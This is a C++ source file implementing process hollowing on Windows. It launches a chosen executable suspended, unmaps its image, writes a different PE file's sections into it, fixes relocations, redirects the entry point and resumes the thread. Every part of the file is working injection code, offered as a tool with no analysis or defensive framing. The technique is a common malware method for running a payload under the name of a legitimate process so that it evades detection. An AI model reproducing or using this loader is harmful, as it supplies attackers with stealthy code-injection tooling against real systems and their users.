#include<iostream>
#include<Windows.h>
#include<winnt.h>
#include<winternl.h>

using namespace std;

#pragma comment(lib,"ntdll.lib")

EXTERN_C NTSTATUS NTAPI NtTerminateProcess(HANDLE, NTSTATUS);
EXTERN_C NTSTATUS NTAPI NtUnmapViewOfSection(HANDLE, PVOID);
EXTERN_C NTSTATUS NTAPI NtResumeThread(HANDLE, PULONG);

typedef struct BASE_RELOCATION_BLOCK {
	DWORD PageAddress;
	DWORD BlockSize;
} BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

int main() {
	char src[1000] = "msgbox.exe";
	char des[1000] = "BASECALC.EXE";
	LPSTARTUPINFOA si = new STARTUPINFOA();
	LPPROCESS_INFORMATION pi = new PROCESS_INFORMATION();

	cout << "Source File : " << endl;	cin >> src;
	cout << "Destination File : " << endl; cin >> des;

	if (!CreateProcessA(NULL, des, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, si, pi)) {
		cout << "Create Thread Failed !!!" << endl;
		return 0;
	}

	HANDLE destProcess = pi->hProcess;
	HANDLE destThread = pi->hThread;

	PPROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
	
	NtQueryInformationProcess(destProcess, ProcessBasicInformation, pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL);

	DWORD destImageBaseOffset = (DWORD)pbi->PebBaseAddress + 8;
	LPVOID destImageBase = 0;

	ReadProcessMemory(destProcess,(LPCVOID) destImageBaseOffset, &destImageBase, 4, NULL);

	if (NtUnmapViewOfSection(destProcess, destImageBase)) {
		cout << "Unmap Failed..!!" << endl;
		return 0;
	}

	HANDLE srcHandle = CreateFileA(src, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (srcHandle == INVALID_HANDLE_VALUE) {
		cout << "Create File Failed ..!!" << endl;
		return 0;
	}

	DWORD srcFileSz ;
	srcFileSz = GetFileSize(srcHandle, NULL);
	LPVOID buff;
	buff = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, srcFileSz);
	if (!ReadFile(srcHandle, buff, srcFileSz, NULL, NULL)) {
		cout << "ReadFile Failed..!!";
		return 0;
	}
	CloseHandle(srcHandle);
	PIMAGE_DOS_HEADER srcDos = (PIMAGE_DOS_HEADER)buff;
	PIMAGE_NT_HEADERS32 srcNT = (PIMAGE_NT_HEADERS32)((DWORD)buff + srcDos->e_lfanew);

	destImageBase = VirtualAllocEx(destProcess, destImageBase, srcNT->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!destImageBase) {
		cout << "Allocate Error..!!!" << endl;
		return 0;
	}

	DWORD delta = (DWORD)destImageBase - srcNT->OptionalHeader.ImageBase;

	srcNT->OptionalHeader.ImageBase = (DWORD)destImageBase;

	cout << "Write Source Header to Process ..!!!" << endl;

	WriteProcessMemory(destProcess, destImageBase, buff, srcNT->OptionalHeader.SizeOfHeaders, NULL);

	cout << "Write Source Section to Process ..!!!" << endl;
	PIMAGE_SECTION_HEADER srcSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)buff + srcDos->e_lfanew + sizeof(IMAGE_NT_HEADERS32));
	PIMAGE_SECTION_HEADER srcSectionHeader2 = srcSectionHeader;

	for (int i = 0; i < srcNT->FileHeader.NumberOfSections; ++i) {
		PVOID GhiVaoDay = (LPVOID)((DWORD)destImageBase + srcSectionHeader->VirtualAddress);
		PVOID DocTuDay = (LPVOID)((DWORD)buff + srcSectionHeader->PointerToRawData);
		WriteProcessMemory(destProcess, GhiVaoDay, DocTuDay, srcSectionHeader->SizeOfRawData, NULL);
		srcSectionHeader++;
	}

	cout << "Get Address Relocation Table .. !!!" << endl;
	IMAGE_DATA_DIRECTORY relocDir = srcNT->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

	for (int i = 0; i < srcNT->FileHeader.NumberOfSections; ++i) {
		BYTE* relocc = (BYTE*)".reloc";
		if (memcmp(srcSectionHeader2->Name, relocc,6) != 0) {
			srcSectionHeader2++;
			continue;
		}

		DWORD relocOffset = 0; // offset in reloc table
		DWORD startOffset = srcSectionHeader2->PointerToRawData;

		while (relocOffset < relocDir.Size) {
			PBASE_RELOCATION_BLOCK relocBlock = (PBASE_RELOCATION_BLOCK)((DWORD)buff + startOffset + relocOffset);
			relocOffset += sizeof(BASE_RELOCATION_BLOCK);
			DWORD numberEntry = (relocBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK))/sizeof(BASE_RELOCATION_ENTRY);
			PBASE_RELOCATION_ENTRY relocEntry = (PBASE_RELOCATION_ENTRY)((DWORD)buff + startOffset + relocOffset);
			for (int i = 0; i < numberEntry; ++i) {
				relocOffset += sizeof(BASE_RELOCATION_ENTRY);
				if (relocEntry[i].Type == 0) {
					continue;
				}
				DWORD needToFix = relocBlock->PageAddress + relocEntry[i].Offset;
				DWORD buffer = 0;
				ReadProcessMemory(destProcess, (LPCVOID)(needToFix + (DWORD)destImageBase), &buffer, 4, NULL);
				buffer += delta;
				WriteProcessMemory(destProcess, (LPVOID)(needToFix + (DWORD)destImageBase), &buffer, 4, NULL);
			}
		}
		break;
	 }

	LPCONTEXT pctx = new CONTEXT();
	pctx->ContextFlags = CONTEXT_INTEGER;

	DWORD OEP = (DWORD)destImageBase + srcNT->OptionalHeader.AddressOfEntryPoint;
	pctx->Eax = OEP;
	SetThreadContext(pi->hThread, pctx);
	ResumeThread(pi->hThread);
	return 0;
}